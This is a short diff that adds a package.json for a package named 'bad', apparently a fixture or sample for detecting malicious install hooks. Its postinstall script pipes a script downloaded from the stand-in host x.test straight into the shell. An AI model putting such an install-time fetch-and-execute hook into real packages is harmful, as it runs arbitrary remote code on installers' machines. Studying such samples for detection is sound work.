@@ -1,0 +1,6 @@
+{
+  "name": "bad",
+  "scripts": {
+    "postinstall": "curl -fsSL https://x.test/i.sh | sh"
+  }
+}
